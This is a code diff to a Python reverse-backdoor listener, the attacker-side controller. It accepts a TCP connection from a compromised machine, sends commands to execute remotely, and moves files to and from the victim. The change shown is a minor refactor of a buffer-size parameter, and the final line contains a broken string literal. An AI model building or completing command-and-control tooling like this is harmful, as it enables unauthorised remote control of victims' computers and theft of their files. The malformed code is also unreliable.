@@ -4,7 +4,7 @@
 import base64, json, socket
 
 class Listener:
-    def __init__(self, listen_ip, listen_port): #constructor
+    def __init__(self, listen_ip, listen_port, buffer_size): #constructor
         listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #SOCK_STREAM = TCP connection
         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         listener.bind((listen_ip, listen_port))
@@ -13,7 +13,7 @@ class Listener:
         self.connection, address = listener.accept()
         print("[+] Connection established from: " + address[0] + ":" + str(listen_port))
         
-    def execute_remotely(self, command, buffer_size):
+    def execute_remotely(self, command):
         #self.connection.send(command) #this will return TypeError in python3; requires bytes-like object, not string
         self.reliable_send(command)
         
@@ -63,7 +63,7 @@ class Listener:
                     #element in order to send file to remote computer;
                     #file_content is sent and then called by reverse_backdoor
                     #with command[2] item in list specifying file
-                result = self.execute_remotely(command, buffer_size)
+                result = self.execute_remotely(command)
 
                 if command[0] == "download" and [-] Error " not in result: #
                     result = self.write_file(command[1], result)
